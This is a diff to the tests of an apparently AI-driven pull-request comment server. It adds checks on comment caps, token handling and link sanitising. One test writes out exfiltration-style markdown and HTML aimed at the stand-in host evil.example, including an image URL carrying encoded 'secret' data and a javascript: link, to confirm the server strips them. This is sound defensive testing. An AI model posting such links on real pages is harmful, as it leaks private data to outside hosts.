@@ -356,7 +356,7 @@ class CommentServerTests(unittest.TestCase):
     def setUp(self):
         self.temp = tempfile.TemporaryDirectory()
         self.posted = Path(self.temp.name) / "posted"
-        self.config = {"number": 42, "head": SHA, "token": TOKEN, "posted": str(self.posted), "count": 0}
+        self.config = {"number": 42, "head": SHA, "token": TOKEN, "posted": str(self.posted)}
         self.posts = []
         self.pull = pull()
 
@@ -422,6 +422,36 @@ class CommentServerTests(unittest.TestCase):
         self.assertTrue(all(r["isError"] for r in results[review_mcp.MAX_COMMENTS:]))
         self.assertIn("already posted", results[-1]["content"][0]["text"])
 
+    def test_the_cap_counts_what_this_run_already_posted_even_across_a_restart(self):
+        # Re-review of #21, L-c: the count is MAY_REVIEW_POSTED's, not the server's memory.
+        self.posted.write_text("started\n" + "inline\n" * 20 + "failed\n" * 9 + "refused\n" * 5 + "started\n")
+        results = self.converse(("create_summary_comment", {"body": "one more"}), ("create_summary_comment", {"body": "and another"}))
+        self.assertEqual(len(self.posts), 1)
+        self.assertFalse(results[0]["isError"])
+        self.assertIn("already posted", results[1]["content"][0]["text"])
+
+    def test_nothing_in_a_body_can_fetch_from_or_link_to_another_host(self):
+        # Re-review of #21, L-b: GitHub's image proxy fetches an image's URL when someone views the pull request.
+        suggestion = "```suggestion\nconst urls: Array<string> = ['https://evil.example/x'];\n```\n"
+        body = ("Leak ![a](https://evil.example/i.png?d=c2VjcmV0) and [b](https://evil.example/?d=x) "
+                "<img src=\"https://evil.example/p.png\"> <https://evil.example/auto> www.evil.example/w http://evil.example "
+                "//evil.example/r https://github.com.evil.example/x [c](HTTPS://EVIL.example) [d](javascript:alert(1)) "
+                "[e]( https://evil.example \"title\")\n[ref]: https://evil.example/ref\n![f][ref]\n"
+                "Code: [g](https://github.com/May-Assistant/may-app/blob/" + SHA + "/a.ts#L1-L3) [h](#L4) [i](backend/a.ts)\n"
+                + suggestion + "and `<b>https://evil.example/span</b>` stays code.")
+        [result] = self.converse(("create_inline_comment", {"path": "a.ts", "line": 3, "body": body, "confirmed": True}))
+        self.assertFalse(result["isError"])
+        posted = self.posts[0][1]["body"]
+        prose = posted.replace(suggestion, "").replace("`<b>https://evil.example/span</b>`", "")
+        self.assertNotIn("evil.example", prose)
+        self.assertNotIn("![", prose)
+        self.assertNotIn("<img", prose)
+        self.assertNotIn("<https", prose)
+        self.assertIn(suggestion, posted, "a suggestion's code is left exactly as written")
+        self.assertIn("`<b>https://evil.example/span</b>`", posted)
+        self.assertIn(f"[g](https://github.com/May-Assistant/may-app/blob/{SHA}/a.ts#L1-L3) [h](#L4) [i](backend/a.ts)", posted)
+        self.assertTrue(posted.endswith(f"\n\n<!-- may-app-review head={SHA} -->" + review_mcp.FOOTER))
+
     def test_nothing_is_posted_once_the_pull_request_changed(self):
         # Security review of #21, L1: closed, drafted, retargeted or pushed to during the run.
         for change in ({"state": "closed"}, {"draft": True}, {"base": {"ref": "release"}}, {"head": {"sha": OTHER}}):
@@ -459,10 +489,11 @@ class CommentServerTests(unittest.TestCase):
     def test_it_starts_only_with_a_pull_request_a_head_and_a_readable_token_file(self):
         token_file = Path(self.temp.name) / "token"
         token_file.write_text(TOKEN)
-        good = {"MAY_PR_NUMBER": "42", "MAY_REVIEW_HEAD": SHA, "MAY_REVIEW_TOKEN_FILE": str(token_file)}
+        good = {"MAY_PR_NUMBER": "42", "MAY_REVIEW_HEAD": SHA, "MAY_REVIEW_TOKEN_FILE": str(token_file), "MAY_REVIEW_POSTED": str(self.posted)}
         self.assertEqual(review_mcp.settings(good)["token"], TOKEN)
         self.assertIsNone(review_mcp.settings({**good, "MAY_REVIEW_TOKEN_FILE": "", "GH_TOKEN": TOKEN}), "never from the environment")
-        for change in ({"MAY_REVIEW_TOKEN_FILE": str(token_file) + ".missing"}, {"MAY_PR_NUMBER": "4a"}, {"MAY_REVIEW_HEAD": "main"}):
+        for change in ({"MAY_REVIEW_TOKEN_FILE": str(token_file) + ".missing"}, {"MAY_PR_NUMBER": "4a"}, {"MAY_REVIEW_HEAD": "main"},
+                       {"MAY_REVIEW_POSTED": ""}):
             with self.subTest(change=change):
                 self.assertIsNone(review_mcp.settings({**good, **change}))
 
@@ -546,6 +577,7 @@ class ReviewWorkflowShapeTests(unittest.TestCase):
             "the checkout as working directory": ("cwd=view / \"work\",", "cwd=view / \"source\",", "empty work directory"),
             "an added directory": ('"--plugin-dir", str(plugin),', '"--plugin-dir", str(plugin), "--add-dir", str(view / "source"),', "empty work directory"),
             "another view": ('VIEW = Path("/tmp/may-review-view")', 'VIEW = Path("/home/runner/view")', "VIEW is not"),
+            "the token file kept": ("            secret.unlink(missing_ok=True)", "            pass", "token file"),
         }
         for case, (old, new, fragment) in cases.items():
             with self.subTest(case=case):
